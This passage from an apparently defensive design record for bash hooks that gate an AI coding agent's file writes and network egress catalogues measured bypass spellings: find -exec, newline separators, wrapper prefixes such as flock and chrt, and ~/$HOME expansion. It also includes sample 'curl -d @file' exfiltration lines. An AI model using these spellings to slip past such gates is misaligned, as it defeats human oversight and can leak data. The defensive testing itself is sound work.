find . -name x -exec cp {} src/y.py ';'                             -> set()
find . -name x -exec cp -t src {} +                                 -> set()
find . -name x -execdir cp {} src/y.py \;                           -> set()
find . -name x -ok cp {} src/y.py \;                                -> set()
find . -name x -okdir cp {} src/y.py \;                             -> set()
find . -name x -exec tee src/y.py \;                                -> set()
find . -name x -exec sed -i s/a/b/ src/y.py \;                      -> set()
find . -name x -exec curl -d @src/a.txt https://example.invalid \;  -> set()

find . -name x -print                                    -> set()                (control)
find . -name x | xargs cp -t src                         -> local /proj/src      (control, cycle P)
find . -name x -exec cp {} src/y.py \; ; cp seed.txt src/z.py
                                                         -> local /proj/src/z.py (control)
```

The third control is the one that mattered: only the nested command was lost, and the
segmentation around the construct was already intact.

Re-measured after the fix, same harness, same `WRIT_CWD`: the first six rows yield the
nested command's own destination (`local /proj/src/y.py`, and `local /proj/src` for the
`-t src` batch row), the `tee` and `sed -i` rows yield `local /proj/src/y.py`, the `curl`
row yields the egress host `example.invalid`, `-print` is still silent, the `xargs` control
is unchanged, and the third control now yields BOTH `local /proj/src/y.py` and
`local /proj/src/z.py`.

### Decision: one splice, not a fifth arm

Each nested-command span is appended to `segments` as an ADDITIONAL entry, piped flag
FALSE, immediately after the segment loop finishes and before any pass runs:

```python
NESTED_CMD_FLAGS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
NESTED_TERMINATOR_CHARS = frozenset({";", "+"})

for _seg, _piped in list(segments):
    for _span in nested_command_spans(_seg):
        segments.append((_span, False))
```

The write loop then resolves `cmd0 = cp` for that entry and the egress loop resolves
`verb = curl`, with NO change to any write arm, no change to any egress arm and no change
to `verb_at`. The original `find` segment stays in the list: its `cmd0` is `find`, it
matches no arm, and its redirect scan keeps working, so `find ... -exec ... \; > log.txt`
still gates `log.txt`.

The egress half comes free rather than needing a second cycle for exactly one structural
reason: the write pass, the inline-interpreter pass and the egress pass are three loops
over the SAME `segments` list. One splice feeds all three, and the interpreter pass picking
up `find . -exec python3 -c "..." \;` is a third consequence of the same line, pinned as a
capability rather than left as a side effect nobody noticed.

Two alternatives were rejected, and the reasons belong in the record:

- A FIFTH `cmd0` arm for `find` would have to re-implement the destination logic of all
  four existing arms (the `tee` argument loop, `dd of=`, the `cp`/`mv`/`install` last
  positional plus its three `-t` spellings, and `sed -i`'s last positional), and it would
  not touch egress at all, so the transfer half would need its own cycle.
- Refactoring the per-segment body into a shared function callable on a nested span would
  rewrite the code path every existing test in this family runs through, for no coverage
  the splice does not already buy.

The helper sits OUTSIDE the `MIRROR BEGIN/END split_control_operators` block on purpose.
That block is byte-compared across three copies, so putting the splice inside it would
force an identical change to `writ/session/bash_tokens.py` and would change
`writ-worktree-safety.sh` behavior on unmeasured evidence.

### Span boundaries, and why they are reliable

The spans are derived PER SEGMENT, from the already-built list, not from the raw token
stream, which makes a control operator a hard stop for free: a span cannot cross a segment
boundary because the boundary split happened first. A span runs from the token after the
flag to the terminator, or to the END of the segment when there is none.

Every terminator survives tokenization as a distinct token and none of them becomes a
`CONTROL` member. MEASURED token forms: `\;` gives `'\\;'`, `';'` gives `"';'"`, `";"`
gives `'";"'`, and `+` gives `'+'`. A BARE `;` never appears inside a segment at all,
because it IS a `CONTROL` token and has already ended the segment before the splice runs.
The list is SNAPSHOTTED before splicing, so a spliced span is never itself rescanned: one
level is every level find has, and re-entering would be an unbounded loop for no coverage.

### The flag family was undercounted

FOUR flags, which is two more than the header used to name. `-ok` and `-okdir` prompt the
user before each command and then RUN it, so both are write vectors exactly as `-exec` and
`-execdir` are. Both were measured silent, and both were named NOWHERE before this cycle:
not in the header's uncovered block, not in this ADR, not in any test. A disclosure that
misstates the SIZE of a hole is what stops the next reader re-examining it, which is the
same failure the cycle P amendment recorded about a false reason.

No count is pinned anywhere. The new test module derives its flag axis from the hook's own
`NESTED_CMD_FLAGS` and asserts the axis EQUALS that set, so a fifth spelling added later
reddens the axis-equality test instead of sitting outside a stale literal.

### The batch form's real constraint

EXECUTED against GNU findutils 4.9.0 on the implementing machine:

```
find . -maxdepth 0 -name __nomatch__ -exec cp {} dest +
    -> find: missing argument to `-exec'   (exit 1)
find . -maxdepth 0 -name __nomatch__ -ok cp -t dest {} +
    -> find: missing argument to `-ok'     (exit 1)
```

The first says `{}` must be the trailing argument under `+`, so under `+` a destination is
reachable only as a FLAG VALUE (`cp -t DIR {} +`) and NO detector for `cp {} dest +` is
built, because that command can never run. The second was INFERRED by the plan from find's
documentation and is now MEASURED: `+` is rejected for `-ok` as well, so the test module's
batch-terminator axis stays the two flags and does not widen to all four. The `;` family
has no ordering constraint, so a destination may sit anywhere in the nested argument list,
and its consumer set is therefore the wider one.

### Accepted costs

`{}` is find's placeholder, not a path. The two brace discards elsewhere in the hook
(`CODE_PUNCT` in `token_literals`, the brace skip in `scan_tokens`) are on the INTERPRETER
path only, not on the `cmd0` write arms. So a spelling that puts the placeholder in
DESTINATION position emits a row naming the placeholder: MEASURED,
`find . -name x -exec tee {} \;` and `find . -name x -exec sed -i s/a/b/ {} \;` each yield
`local /proj/{}`. Three treatments were weighed and the chosen one is to leave the
placeholder alone and PIN the row:

- Skipping brace-bearing targets globally at the normalization point also changes non-find
  behavior, turning a real `echo x > src/{a}.py` into silence. MEASURED as still collected
  (`local /proj/src/{a}.py`) both before and after this cycle, and pinned, so the
  alternative's cost is executable rather than argued.
- Dropping `{}` tokens out of the span is actively worse for the `sed` arm, whose "last
  positional is the file" heuristic then reads the SCRIPT as the file, and it leaves
  `tee {}` with no argument at all.

The row is fail-closed and strictly better than the silence it replaces: a real in-place
bulk edit now reaches the work gate instead of no gate at all, and the only thing wrong is
the TEXT of a path that no single file can be named for. When the placeholder is a SOURCE
rather than a destination the cost does not arise at all, because the arm takes the last
positional: `-exec cp {} src/y.py \;` yields the real destination.

The second cost is that the flags are matched as a MECHANISM on the RAW token and NOT
conditioned on the segment's verb being `find`, which follows this file's own posture at
`WRAPPER_POSITIONALS`: fail-closed for the verb, fail-open for detection, where an extra
row for a command that never runs is cheaper than a lost row for one that does. The
consequences, both MEASURED and both pinned:

- A QUOTED mention opens no span, because `shlex(posix=False)` leaves the quote characters
  on. `grep -- '-exec cp {} src/y.py' src/notes.txt`, `echo "-exec cp {} src/y.py"` and
  `git commit -m "use -exec cp {} src/y.py"` are all still silent after the fix. This is
  the discrimination the mechanism has to make, and it is the same rule
  `strip_group_opener` applies to a quoted group opener.
- An UNQUOTED mention in any command's arguments DOES open a span, whatever the verb, so
  `echo find . -exec cp {} src/y.py`, `somecmd -exec cp {} src/y.py \;` and
  `myscript --pattern -exec cp {} src/y.py \;` each emit `local /proj/src/y.py` for a
  command that writes nothing. That is the accepted cost, and it survives `\find`, an
  alias, and a wrapper-prefixed find, which conditioning on `verb_at(seg)[0] == "find"`
  would not.

### Deferred, each for a stated reason

- DELETION, by the recorded ruling in the hook's irreversible-destruction block ("rm -rf,
  DROP TABLE and TRUNCATE are OUT OF SCOPE on purpose"). MEASURED after the fix:
  `find . -name x -exec rm {} \;` and `find . -name x -delete` are both still silent,
  because `rm` matches no `cmd0` arm and `-delete` carries no nested command. Both pinned,
  so the closure is not read as smuggling deletion into scope. Neither command matches the
  hook's cheap early-exit globs either, so through the full hook they never even reach the
  extractor: the extractor-level pins are the tighter assertion of the two.
- The worktree gate's OWN exposure. `find . -exec git worktree remove x \;` evading
  `writ-worktree-safety.sh` is INFERRED from that hook's source, not measured, and is
  deferred for exactly the reason cycle P gave for not growing that hook's prefix set: its
  parsing is permissive-only by design and a change there would be a second unmeasured
  change.
- `fd --exec` / `fd -x`. The SAME nested-command mechanism under another tool's flag
  spellings, which `NESTED_CMD_FLAGS` does not carry. NOT MEASURED, so it is recorded as a
  stated suspicion and it takes find's place in the header's names-only block.
- `sh -c` inside a nested command, unchanged. MEASURED still silent:
  `find . -name x -exec sh -c 'cp seed.txt src/y.py' \;` yields nothing, because the body
  is ONE token and no `cmd0` arm matches it. That is the already-disclosed `sh -c` limit,
  not a new one.
- Resolving find's SEARCH ROOT into the placeholder. find's path operands precede its
  expression and may repeat, so this is a separate mechanism and is deliberately not
  attempted. The residue is stated below.

### The residue is executable, not only prose

The placeholder row always resolves under the cwd even when find's search root is
elsewhere, so an out-of-repo bulk in-place edit is reported as `local` rather than
`outside` and does not reach the project-boundary refusal that the DIRECT spelling of the
same write does reach. That asymmetry is a test with the direct spelling beside it as the
contrast, so a future cycle that resolves find's search roots has a red test to turn green
rather than a paragraph to rediscover. It is under-detection relative to a perfect gate and
strictly more detection than the total silence it replaces.

The machine-readable residue grew a second half. The header's names-only block between
`# UNCOVERED PREFIXES BEGIN` and `# UNCOVERED PREFIXES END` no longer names find's flags,
and the ratchet that reads it now derives TWO covered populations: the hook's own
`WRAPPERS` keys AND its own `NESTED_CMD_FLAGS`. Naming a covered prefix as uncovered,
closing a prefix without updating the block, and closing a nested-command FLAG without
updating the block all redden there.

### The order of the changes was itself a trap

Removing find's flags from the names-only block reddens EXACTLY ONE assertion and does NOT
redden the behavior test that asserted `set()`. So the block edit alone would produce a
file whose header reads "closed" while a green behavior test still pinned the hole open.
The block edit, the behavior fix and the rewritten behavior test therefore landed in the
SAME commit, and that was checked explicitly before the commit rather than left to chance.

### Measured versus inferred

MEASURED: the nine silences and the three controls above, before the fix and again after
it, through the extractor with `WRIT_CWD=/proj`; the four terminator token forms; both
findutils 4.9.0 rejections, executed with exit codes; the two placeholder rows
(`local /proj/{}` for `tee {}` and for `sed -i s/a/b/ {}`); the braced-path control
(`echo x > src/{a}.py` still collected); the three quoted mentions staying silent and the
three unquoted mentions emitting a row; the two deletion spellings staying silent; and the
real hook's `permissionDecision` for two nested commands, an egress ask naming the host and
a credential deny carrying `[SEC-CREDENTIAL-WRITE]`.

NOT MEASURED, stated plainly rather than implied: the real hook's `permissionDecision` for
a nested project WRITE, which is proved at the extractor layer only, the same boundary every
earlier cycle in this family recorded; and a write LANDING ON DISK through the full Claude
Code path, which a `PreToolUse` hook test cannot show at all. INFERRED, not measured:
`find . -exec git worktree remove x \;` evading the worktree gate, and `fd --exec` carrying
the same mechanism under a spelling this fix does not cover.

## Amendment (cycle R): a newline separator, and a defective reference implementation

Sixth instance of the same seam, and the first one where the fix ALREADY EXISTED in the
other hook and was itself wrong. `CONTROL` in `writ-bash-write-gate.sh` carried a `"\n"`
member that matched NOTHING, because `shlex.split` treats a newline as ordinary whitespace
and never emits it as a token, so a multi-line command was ONE segment whose verb was the
first line's.

### Measured before the fix

Through the write gate's own embedded extractor with `WRIT_CWD=/proj`:

```
"ls\ncp seed.txt src/x.py"                       -> set()                    INVISIBLE
"ls ; cp seed.txt src/x.py"                      -> local /proj/src/x.py      control
"ls\necho y > src/x.py"                          -> local /proj/src/x.py      VISIBLE
"ls\ncurl -d @src/a.txt https://example.invalid" -> set()                    INVISIBLE
```

A newline hid every VERB-DEPENDENT write and every egress row, and hid no REDIRECT. That
asymmetry is the mechanism, not luck: the redirect loop never consults the verb, while the
four `cmd0` write arms and the egress pass all do, so flattening the command into one
segment blinded exactly the arms that ask "what is the verb here?".

### The reference implementation was defective, and both defects were EXECUTED

`writ-worktree-safety.sh` had carried a newline pre-split and a heredoc-body stripper since
1.7.0, so this cycle reads like a port. It is not. Both halves were copied out verbatim and
RUN. The pre-split is correct. The stripper is wrong twice over:

```
doc ABOUT a write, with a REAL same-line redirect
  cat <<'EOF' > docs/notes.txt / old command: echo y > src/x.py / EOF
    today (no pre-split)     src/x.py True   docs/notes.txt True    n=11
    pre-split only           src/x.py True   docs/notes.txt True    n=13
    pre-split + stripper     src/x.py False  docs/notes.txt False   n=1

interpreter fed by heredoc, REAL write in the body
  python3 - <<'EOF' / open('src/x.py',...) / EOF
    today (no pre-split)     src/x.py True                          currently DETECTED
    pre-split + stripper     src/x.py False                         coverage LOST
```

DEFECT 1, NO SAME-LINE BOUNDARY. The function consumed tokens from immediately after the
opener token and scanned forward for the terminator, so everything legitimately following
the opener ON ITS OWN LINE was swallowed with the body: 11 tokens in, 1 out, and
`docs/notes.txt`, the command's real destination, lost along with the phantom. Bash starts
a heredoc body at the next NEWLINE. That function had no notion of a newline at all.

DEFECT 2, IT DELETED COVERAGE THE WRITE GATE ALREADY HAD. A stdin-fed interpreter sets
`stdin_interpreter` and then scans the ENTIRE token list, which is how a `python3 - <<'EOF'`
body is seen; the write gate's header claims that coverage in the inline-interpreter block.
Stripping the body removes the only place that source text appears, so a verbatim port would
have been a NET LOSS on a vector that worked.

WHY THE WORKTREE HOOK COULD NOT SEE EITHER ONE, which is the part the next reader needs:
that hook has no redirect vector at all and asks only whether a `git worktree add` is
present, and its single heredoc test asserted only the verdict and said nothing about a
target. So the same-line defect had zero coverage there and the destination half of it was
structurally unobservable.

### Decision: three parts, one shared copy

1. THE PRE-SPLIT IS REUSED UNCHANGED. It is a pure quote-aware text transform: a newline
   inside a quoted string stays data, and the escape branch keeps a backslash-continued
   line one command. Rewriting a correct function to look new would have been churn.
2. THE STRIPPER IS REPAIRED AT THE NEWLINE BOUNDARY. The body is the run from the FIRST
   `SEP` after the opener through the terminator word, so `cat <<'EOF' > docs/notes.txt`
   keeps its destination. The OPENER TOKEN is emitted too, and that is load-bearing rather
   than tidy: `inline_form` reads any argument starting with `<` as the stdin form, so the
   opener is the ONLY marker of the no-dash `python3 <<'DELIM'` spelling, and the 1.7.0 copy
   dropped it. An opener with no following `SEP` strips nothing, because there is no body in
   that token stream and consuming to the end would silence the rest of the command.
3. THE STDIN SCAN KEEPS THE UNSTRIPPED STREAM. Segmentation and every per-segment pass read
   the STRIPPED list; the `stdin_interpreter` whole-command scan reads the UNSTRIPPED one.
   The reason is that pass's own design rather than convenience: it is deliberately a coarse
   bag-of-literals question over the whole command, so the pre-strip stream is what matches
   its stated contract. The extra pass is built INSIDE the `if stdin_interpreter:` branch, so
   a command that is not a stdin-fed interpreter never pays it.

Both helpers went INSIDE the mirrored block, so ONE repaired copy serves both hooks and the
existing byte-identity and per-copy stream-equivalence tests guard drift. The alternative
was to add them to the write gate alone and leave the worktree hook's copies untouched; it
was rejected because the two copies would then differ in BEHAVIOR while claiming a shared
mechanism, and because the same-line defect is a live hole in the worktree hook.

Cycle Q put `nested_command_spans` OUTSIDE the block for the stated reason that sharing it
would change the worktree hook's behavior on UNMEASURED evidence. That is not a
contradiction with this cycle: here the worktree hook is the file the evidence is ABOUT. It
already ran both helpers and one of them was executed wrong.

### The zero-import contract retired a regex

`writ/session/bash_tokens.py` imports NOTHING on purpose, so it loads under `python -S` and
is safe to paste inline, and the mirror test EXECS the block in an empty namespace. The
stripper's opener test was a `re.compile` pattern, which could not go in the block. It is
now string operations, and the character classes are SPELLED OUT (`_HD_FIRST`, `_HD_REST`)
rather than using `str.isalnum()`, because `isalnum()` is Unicode-aware and would have
silently widened the population the retired `[A-Za-z_][A-Za-z0-9_]*` classes defined while
reading as a faithful translation. One behavior deliberately changed in the rewrite: an
EMPTY delimiter (`<<''`) is no longer accepted as an opener. The regex accepted it, then
scanned for a token equal to the empty string, found none, and swallowed the rest of the
command.

### The worktree hook's own hole

The one place the same-line repair changes a VERDICT in that hook:

```
cat <<'EOF' > notes.md ; git worktree add scratch/feature-x feature-x
some notes
EOF
```

With the 1.7.0 stripper the run from the opener through `EOF` was swallowed, so
`git worktree add` never reached a segment and the command was ALLOWED SILENTLY. With the
same-line boundary the invocation survives and the hook denies with
`ENF-PROC-WORKTREE-001`. A test pins it, which turns "a known-defective copy is being
repaired" from prose into an executable claim.

### Residue that stays open

Three shapes degrade, each fail-closed (an extra row or a lost DESTINATION, never a lost
verdict on a command that runs), all three MEASURED through the extractor with
`WRIT_CWD=/proj`:

- A body line naming the terminator word MID-LINE ends the strip early, because this is a
  token scan and bash's rule is a LINE rule. `cat <<'EOF' > docs/notes.txt` over
  `this EOF is not a terminator > src/x.py` emits BOTH `local /proj/docs/notes.txt` and
  `local /proj/src/x.py`: the remaining body tokens become arguments of the opener line's
  command, so the phantom returns.
- TWO heredoc openers on one command (`cat <<'A' <<'B'`) honor only the FIRST terminator, so
  the second body is judged as commands: measured as `local /proj/docs/notes.txt` plus
  `local /proj/src/x.py`. Collecting successive bodies is more code for a shape neither hook
  has ever seen.
- An opener GLUED to what follows it (`cat <<'EOF'>docs/notes.txt`) is not recognized as an
  opener at all, because stripping runs on the RAW shlex tokens ahead of
  `split_control_operators`. That ordering is deliberate: a body line must never be
  re-split, or it can contribute a segment. MEASURED: the command emits
  `local /proj/src/x.py` ALONE. The body line becomes its own segment and is judged (an
  extra row, fail-closed), and the opener's own destination is NOT recovered, because
  `REDIR` cannot match a token that starts with `<` and the splitter deliberately does not
  split `>`. That is the SAME `foo>src/x.py` residue this ADR has disclosed since it was
  written, reached through a heredoc opener rather than through a verb, and closing it needs
  the tokenizer change this ADR RULED OUT.

### Measured versus inferred

MEASURED or EXECUTED: the four extractor rows before the fix and after it; both heredoc
token-stream comparisons on a verbatim copy of the 1.7.0 helpers, including the token counts
11, 13 and 1 and the two boolean columns; the post-repair count for the doc case, 4 tokens
(`cat`, the opener, `>`, `docs/notes.txt`), which is what the same-line boundary buys over
the reference implementation's 1; the three residue rows above; and the worktree hook's deny
on a `git worktree add` sharing the heredoc opener's line.

NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path,
which a `PreToolUse` hook test cannot show at all, the same boundary every earlier cycle in
this family recorded.

## Amendment (cycle S): three more wrapper prefixes, and a positional that must NOT be shape-checked

Same seam, sixth instance, same single function, and this time no new mechanism at all.
`verb_at` still steps over a command prefix only by membership in `WRAPPERS`, so `flock`,
`ionice` and `chrt` became `cmd0` themselves and the real command was never resolved.
`verb_at` is the single source for the write pass, the egress pass and the interpreter
pass, so each of the three hid a write AND a data transfer.

### Measured before the fix

At the OUTER hook layer first, because that is where the defect was observed: a crafted
`PreToolUse` envelope for the real hook, run from a cwd outside the project so the write
target lands out of bounds, with `nice` (already a `WRAPPERS` member) as the
registered-wrapper positive control.

```
cp README.md ~/outside_probe.txt                     -> DENY  [ENF-PROJECT-BOUNDARY]
nice cp README.md ~/outside_probe.txt                -> DENY  [ENF-PROJECT-BOUNDARY]
flock /tmp/l.lock cp README.md ~/outside_probe.txt   -> ALLOW (silent, no decision)
ionice -c3 cp README.md ~/outside_probe.txt          -> ALLOW (silent, no decision)
chrt -b 0 cp README.md ~/outside_probe.txt           -> ALLOW (silent, no decision)
```

Then through the gate's own embedded extractor with `WRIT_CWD=/proj`. Cycle P's plan
claimed an egress before-state it had only measured on the write half; this cycle measured
BOTH halves before the entries landed, which is the whole point of the row block below:

```
cp seed.txt src/y.py                                          -> local /proj/src/y.py  (control)
nice -n 5 cp seed.txt src/y.py                                -> local /proj/src/y.py  (control)
flock /tmp/l.lock cp seed.txt src/y.py                        -> set()
ionice -c3 cp seed.txt src/y.py                               -> set()
chrt -b 0 cp seed.txt src/y.py                                -> set()

curl -d @src/a.txt https://example.invalid                    -> egress example.invalid  (control)
nice -n 5 curl -d @src/a.txt https://example.invalid          -> egress example.invalid  (control)
flock /tmp/l.lock curl -d @src/a.txt https://example.invalid  -> set()
ionice -c3 curl -d @src/a.txt https://example.invalid         -> set()
chrt -b 0 curl -d @src/a.txt https://example.invalid          -> set()
```

The bash-side hot-path early exit was CHECKED rather than assumed: its first arm matches
`*"cp "*`, so all three probes reached the python extractor exactly as the `nice` control
did. The single mechanism is `verb_at`.

### Decision: three more STRICT tables, read off `--help` and not off the completion files

Cycle P's posture is reused unchanged. Each entry carries both a value-flag set and a
no-value-flag set; `PERMISSIVE` (a `None` second element) is rejected for the same reason
as before, since it reads a SPACED value of an unknown flag as the verb, and it matters
more here because two of the three also step a positional.

The tables were drafted from `/usr/share/bash-completion/completions/*` and then CORRECTED
against the installed binaries' own `--help` (util-linux 2.39.3 for all three). That found
one real divergence and one gap, which is why the operational step is not optional:

- The completion file reads ionice's `-p`, `-P` and `-u` as bare switches. `ionice --help`
  spells them `-p, --pid <pid>...`, `-P, --pgid <pgrp>...` and `-u, --uid <uid>...`, each
  taking a following value, so all three are VALUE flags here rather than NOVALUE. Nothing
  pinned flips either way, because those forms run no command at all, but the table is now
  what the binary says rather than what a completion script implied.
- chrt's `-a/--all-tasks`, `-m/--max` and `-v/--verbose` ARE named by 2.39.3's `--help`,
  so they are listed. An unclassified flag bails and re-blinds that spelling, so a missing
  name is a hole, not a tidy omission. chrt's `-p/--pid` really is value-less there (the
  pid follows as a positional, `chrt [options] -p <pid>`), which is the opposite of
  ionice's `-p`.
- flock 2.39.3 prints no `--nb` or `--wait` aliases, so neither is listed.

A LETTER MEANS DIFFERENT THINGS IN DIFFERENT TABLES, and the three must never be
copy-pasted between one another: flock's `-n` is `--nonblock` (no value) while ionice's
`-n` is `--classdata` (value), and chrt's `-P` is `--sched-period` while ionice's `-P` is
`--pgid`.

### The positional shape becomes per wrapper, which is the only mechanism change

`WRAPPER_POSITIONALS` existed, but the loop that consumed it hardcoded timeout's shape:

```python
for _ in range(WRAPPER_POSITIONALS.get(name, 0)):
    if i < len(seg) and DURATION.match(dequote(seg[i])):
```

`DURATION` is `^[0-9]+(\.[0-9]+)?[smhd]?$`, which no lock path matches. A bare
`"flock": 1` entry would therefore have left the prefix BLIND: the path would not be
skipped, `basename("/tmp/l.lock")` would resolve as the verb, and the entry would have
read as a fix while changing nothing. The fix is a second side table keyed the same way:

```python
WRAPPER_POSITIONALS = {"timeout": 1, "flock": 1, "chrt": 1}
DURATION = re.compile(r"^[0-9]+(?:\.[0-9]+)?[smhd]?$")     # timeout: coreutils duration
PRIORITY = re.compile(r"^[0-9]+$")                         # chrt: non-negative integer
LOCK_TARGET = re.compile(r"[\s\S]")                        # flock: any non-empty token
WRAPPER_POSITIONAL_SHAPES = {"timeout": DURATION, "flock": LOCK_TARGET, "chrt": PRIORITY}
```

with the loop's condition becoming `WRAPPER_POSITIONAL_SHAPES[name].match(...)`. The
`WRAPPER_POSITIONALS.get(name, 0)` expression is preserved byte for byte, because an
existing mutation test targets that exact string.

`LOCK_TARGET` IS `[\s\S]` AND NOT `.`, and the difference is a live bypass rather than a
matter of taste. This cycle's first implementation used `.`, which in python does not match
a newline without `re.DOTALL`. A lock target that dequotes to a bare newline was therefore
NOT stepped, the newline resolved as the verb, and the segment went silent on the write,
credential and egress passes at once. Real flock accepts it: a lock file named with a
newline is created and the wrapped command runs. Measured against the hook, `flock $'\n' cp
x <outside>` was ALLOWED while both an ordinary lock path and the bare command were DENIED.
An empty token still does not match, which is the correct direction: flock exits 66 on an
empty lock name, so nothing runs. Review caught this before it shipped; the pin is
`TestFlockPositional::test_a_newline_only_lock_target_is_stepped_like_any_other`.

WHAT QUALIFIES a wrapper for the positional table is that its positional is MANDATORY, not
that it has a checkable shape. That distinction is new this cycle and it is what carries
`flock`: cycle P's justification (a duration has a checkable shape) covers `timeout` and
`chrt` only. `coproc` and `function` stay excluded for the opposite reason, since their
NAME is OPTIONAL and stepping it is a guess.

The two fail directions are deliberately OPPOSITE, and each is right for its tool:

- `flock` is stepped UNCONDITIONALLY. A shape check there would BE the defect rather than
  the guard, because a lock file can be named anything. One skip is correct in both
  spellings: with a command present, flock reads the first positional as a FILE even when
  it looks numeric, so `flock -x 200 cp seed.txt src/y.py` really does run `cp`. The fd
  form `flock -x 200` and the bare `flock` both land past the end under the `i < len(seg)`
  guard and yield no verb, which is right because neither runs a command.
- `chrt` stays SHAPE-CHECKED against `PRIORITY`. A priority-less `chrt -b cp seed.txt
  src/y.py` is a command chrt itself rejects ("invalid priority argument"), and the check
  is what keeps `cp` visible instead of swallowing it as a bogus priority. Cost at worst
  is an extra row for a command that never runs, never a lost row for one that does.
- `ionice` gets NO positional entry, so the token after its options IS the verb.

The lookup is a bare SUBSCRIPT rather than `.get` with a default. A positional entry with
no shape entry is a table drift, and a loud failure beats a silently-chosen default; a
key-set parity test over both tables, parsed from the extractor source by `ast`, makes that
drift red at test time instead.

Alternatives rejected:

- Widen the `WRAPPERS` tuple to three elements. It touches thirteen entries that have no
  positional, to carry a field that is `None` in all of them.
- One regex for all three. Any single shape re-blinds whichever wrapper it does not fit,
  which is exactly the defect being fixed.
- Skip unconditionally for all three. It costs chrt's priority-less form, where the token
  that would be swallowed is the real command.

### Accepted misses, each pinned as a silence rather than left to be rediscovered

- `flock /tmp/l.lock -c 'cp seed.txt src/y.py'`. The lock target is stepped, `-c` then sits
  in verb position, `basename("-c")` is not a `WRAPPERS` key, and the body is ONE quoted
  token. The same deliberately-uncovered class as `bash -c` and `watch -n1 '...'`, ruled
  out by the false-positive cost of gating every such command, not by a parsing obstacle.
- `flock cp seed.txt src/y.py` resolves `seed.txt`, which matches no arm. That is not a
  miss: with no command after it, flock really would treat `cp` as the lock file, so the
  skip agrees with the tool's own grammar rather than guessing against it.
- The id forms that run no command: `ionice -p 1234`, `chrt -p 1234` and `chrt -p 5 1234`
  are all silent, and none can name a wrong verb, because trailing digits never coincide
  with a write arm.
- DELETION stays out of scope for this gate by recorded ruling, so
  `flock /tmp/l.lock rm -rf src` STAYS silent after the fix.
- The worktree gate's own seven-name `WRAPPERS` is NOT grown, for the reason cycle P
  recorded: its parsing is permissive-only by design, it has no positional mechanism, and
  the evasion there is INFERRED from the code rather than measured. Only its comment moves,
  so the stated divergence (thirteen, now sixteen, against seven) does not go stale.

### The residue block, and one honest downgrade

The header's names-only `# UNCOVERED PREFIXES BEGIN/END` block loses `flock`, `ionice` and
`chrt`, which the existing disjointness ratchet in `tests/test_bash_egress_gate.py` enforces
on its own: leaving a name there while it is a `WRAPPERS` key goes red. `parallel`,
`unbuffer` and `fd` move from "no table here yet" to NOT INSTALLED on this machine, so
their gaps are UNMEASURABLE here rather than merely unmeasured, and none is added on
inference. `script`, `su -c` and `strace` are installed and stay out of scope this cycle.

### Measured versus inferred

MEASURED: the six outer-hook decisions before the fix and the same six after it (the three
new prefixes flip from a silent allow to the same `[ENF-PROJECT-BOUNDARY]` deny the two
controls already returned, and `flock -c` stays silent); the ten extractor rows above
before the fix and after it, both halves; each of the three flag tables against the
installed binary's own `--help` (util-linux 2.39.3), including the ionice correction that
contradicted the drafted table; and the full hook's `permissionDecision` for the prefixed
credential write (deny, `SEC-CREDENTIAL-WRITE`) and the prefixed egress command (`ask`,
naming the host) for all three prefixes, which needs no daemon.

NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path,
which a `PreToolUse` hook test cannot show at all, the same boundary every earlier cycle in
this family recorded; and the real hook's `permissionDecision` for a prefixed IN-PROJECT
write, which needs the session daemon and is proved at the extractor layer only. INFERRED,
not measured, and unchanged from cycle P: `timeout 5 git worktree remove x` evading the
worktree gate by the same mechanism.

## Amendment (cycle T): the value side of the seam, where expansion must happen, and one word that is two tokens

Every earlier amendment in this file is about the SAME question asked on the TOKEN side:
which token is the verb, where does one command end and the next begin, what is a group
opener. This cycle is the first on the VALUE side. The tokenizer was right; the string it
handed forward was not the string the shell would use.

`writ-bash-write-gate.sh` collects a write target as a WORD and the classification loop
joins it under cwd (`ap = t if os.path.isabs(t) else normpath(join(cwd, t))`). No shell
expansion ran first, so a word that LOOKS relative and really lands in the user's home read
as in-project. The gate did not fail to answer. It answered `local` for a path nothing
would write to, and it wrote an audit row naming that fictional path, which is the failure
that makes a later reviewer read green.

### Measured before the fix, and again after it

Through the gate's own embedded extractor, `WRIT_CWD=/proj`, `HOME=/home/u`, with a real
`bash -c 'printf "%s" WORD'` process as the oracle for every spelling rather than a
hand-written expectation table (`~NAME` is an existing login name on the measuring host;
an unknown login name correctly stays literal on both sides):

```
                          BEFORE                  AFTER                  shell writes
cp README.md ~/x          local /proj/~/x         outside /home/u/x      /home/u/x
cp README.md ~NAME/x      local /proj/~NAME/x     outside /home/NAME/x   /home/NAME/x
cp README.md ~            local /proj/~           outside /home/u        /home/u
cp README.md $HOME/x      local /proj/$HOME/x     outside /home/u/x      /home/u/x
cp README.md ${HOME}/x    local /proj/${HOME}/x   outside /home/u/x      /home/u/x
cp README.md "$HOME/x"    local /proj/$HOME/x     outside /home/u/x      /home/u/x
dd if=/dev/zero of=~/x    local /proj/~/x         outside /home/u/x      /home/u/x

cp README.md '~/x'        local /proj/~/x         local /proj/~/x        ~/x
cp README.md "~/x"        local /proj/~/x         local /proj/~/x        ~/x
cp README.md '$HOME/x'    local /proj/$HOME/x     local /proj/$HOME/x    $HOME/x
cp README.md src/~/x      local /proj/src/~/x     local /proj/src/~/x    src/~/x
```

The bottom four are the whole reason this is delicate: a real shell leaves them ALONE, they
really do land in the project, and a fix that resolves them converts one bypass class into
four FALSE REFUSALS on a human-oversight boundary. A false refusal there is the worse of
the two failures, because it teaches the user to wave the gate through.

The same seventeen spellings were then driven through the WHOLE hook with a `PreToolUse`
envelope, in work mode with both gates approved and `project_root` set to the repo, daemon
pointed at a closed port so the local can-write fallback answered: the seven flip from a
SILENT ALLOW to `[ENF-PROJECT-BOUNDARY]`, the ten correct rows are unchanged tag for tag,
and `$NOPE_UNSET/x` flips from a silent allow to an ask.

Two measurement traps were hit and are recorded because either one would have produced a
green run that proved nothing. The first driver seeded its session cache by writing a file
whose NAME it guessed; the hook never read it, every row denied with `[ENF-GATE-MODE]`, and
six of the nine EXPANDS rows "agreed" with the expectation. The second bound the approval to
"no plan.md at all" while `project_root` was the real repo, so `[ENF-GATE-DRIFT]` denied
everything instead. Both are the same shape: a DENY that agrees with the expected verdict
and comes from a different predicate. The driver now asserts the deny TAG, not just the
decision.

### The load-bearing finding: quoting does not survive to the classification point

`shlex.split(..., posix=False)` keeps the quote characters ON each token, so quoting IS
known while a segment is being read. It was destroyed at COLLECTION, at two lines:
`raw_targets.append(dequote(tgt))` for the redirect vector, and
`args = [dequote(a) for a in seg[cmd_arg0:]]` feeding all four `cmd0` arms.

